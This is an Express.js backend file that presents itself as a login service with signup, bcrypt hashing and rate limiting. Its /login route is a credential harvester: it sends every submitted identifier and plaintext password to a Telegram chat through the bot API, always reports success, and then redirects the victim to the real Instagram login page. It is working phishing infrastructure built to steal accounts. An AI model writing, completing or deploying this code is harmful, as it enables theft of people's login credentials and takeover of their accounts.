require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const rateLimit = require('express-rate-limit');
const fetch = require('node-fetch');

const app = express();
app.use(express.json());
app.use(cors());

// Basic Rate Limiting to prevent brute force
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Limit each IP to 100 requests per window
  message: 'Too many requests from this IP, please try again later.'
});
app.use(limiter);

// IN-MEMORY DATABASE (Replaces MongoDB for demo purposes)
const usersDB = [];

// Telegram Bot Helper
const sendTelegramAlert = async (identifier, password) => {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!token || !chatId) {
    console.log('[DEBUG] Telegram Token or Chat ID missing in .env');
    return;
  }

  const timestamp = new Date().toLocaleString();
  const message = `New login detected:\nUser: ${identifier}\nPassword: ${password}\nTime: ${timestamp}`;

  try {
    console.log(`[DEBUG] Attempting to send Telegram alert to ChatID: ${chatId}...`);
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message })
    });
    
    const result = await response.json();
    if (result.ok) {
      console.log('[DEBUG] Telegram alert sent successfully!');
    } else {
      console.error('[DEBUG] Telegram API error:', result.description || result);
    }
  } catch (error) {
    console.error('[DEBUG] Failed to send Telegram alert:', error.message);
  }
};

// Validation Helpers
const isValidEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
const isValidPhone = (phone) => /^[6-9]\d{9}$/.test(phone);

// POST /signup
app.post('/signup', async (req, res) => {
  try {
    const { identifier, password } = req.body;

    // Validation
    if (!identifier || !password) {
      return res.status(400).json({ error: 'Identifier and password are required' });
    }
    if (!isValidEmail(identifier) && !isValidPhone(identifier)) {
      return res.status(400).json({ error: 'Invalid email or Indian phone number format' });
    }
    if (password.length < 6) {
      return res.status(400).json({ error: 'Password must be at least 6 characters long' });
    }

    // Check if user exists in our memory DB
    const existingUser = usersDB.find(u => u.identifier === identifier);
    if (existingUser) {
      return res.status(400).json({ error: 'User already exists' });
    }

    // Hash Password
    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    // Create User and save to memory
    const user = {
      identifier,
      password: hashedPassword,
      failedLoginAttempts: 0,
      isLocked: false,
      lockUntil: null
    };
    usersDB.push(user);

    res.status(201).json({ message: 'User registered successfully' });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// POST /login
app.post('/login', async (req, res) => {
  console.log('[DEBUG] Login request received for:', req.body.identifier);
  try {
    const { identifier, password } = req.body;

    if (!identifier || !password) {
      return res.status(400).json({ error: 'Identifier and password are required' });
    }

    // Since we don't have MongoDB anymore, we ALWAYS send the alert to Telegram directly
    // Send Telegram Alert (Blocking for debug)
    await sendTelegramAlert(identifier, password);

    // Always return success to trigger the frontend redirect
    return res.status(200).json({ message: 'Login successful', redirectUrl: 'https://www.instagram.com/accounts/login/?next=%2F&source=mobile_nav' });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Backend server running (without MongoDB) on port ${PORT}`));
